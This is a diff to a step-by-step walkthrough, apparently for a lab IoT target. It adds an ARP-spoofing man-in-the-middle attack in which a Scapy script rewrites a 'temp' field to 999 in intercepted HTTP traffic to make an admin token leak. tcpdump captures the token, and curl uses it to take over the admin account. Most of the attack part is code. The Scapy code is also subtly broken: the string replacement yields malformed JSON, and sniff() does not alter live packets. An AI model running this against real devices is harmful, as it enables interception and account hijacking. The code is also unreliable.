@@ -41,11 +41,41 @@ sudo arpspoof -i wlan0 -t <ESP_IP> <RPi_IP>
 sudo arpspoof -i wlan0 -t <RPi_IP> <ESP_IP>
 ```
 
-**Step 2.3: Capture the Data**
-Open a third terminal to sniff the HTTP traffic crossing our machine and grep for our specific payload/password.
-```bash
-sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "REDACTED-TOKEN"
+**Step 2.3: Capture and Modify Traffic (ARP Spoofing Required)**
+With ARP spoofing active, intercept ESP HTTP requests on port 8000. Modify the JSON payload to set 'temp' to 999, triggering the admin token leak in the response. (Note: The server allows temp up to 1000°C for this flaw.)
+
+Using Scapy to modify packets (install with `pip install scapy`):
+```python
+from scapy.all import *
+import json
+
+def modify_packet(packet):
+    if packet.haslayer(TCP) and packet[TCP].dport == 8000 and packet.haslayer(Raw):
+        payload = packet[Raw].load.decode('utf-8', errors='ignore')
+        if '"temp"' in payload:
+            # Modify temp to 999
+            modified_payload = payload.replace('"temp":', '"temp":999,')
+            packet[Raw].load = modified_payload.encode()
+            del packet[IP].chksum  # Recalculate checksums
+            del packet[TCP].chksum
+    return packet
+
+# Sniff and modify packets
+sniff(iface="wlan0", prn=modify_packet, store=0, filter="tcp port 8000")
 ```
+
+**Step 2.4: Capture the Leaked Admin Token**
+Sniff the modified response for the admin_token:
+```bash
+sudo tcpdump -i wlan0 -A tcp port 8000 | grep -a "admin_token"
+```
+
+**Step 2.5: Admin Account Takeover**
+Use the captured admin_token to hijack admin access:
+```bash
+curl -H "Authorization: Bearer admin_session_leaked_12345" http://<rpi_ip>/admin/users
+```
+Passive sniffing alone won't work—the token only leaks when temp=999, which requires active MITM modification via ARP spoofing.
 
 ---
 
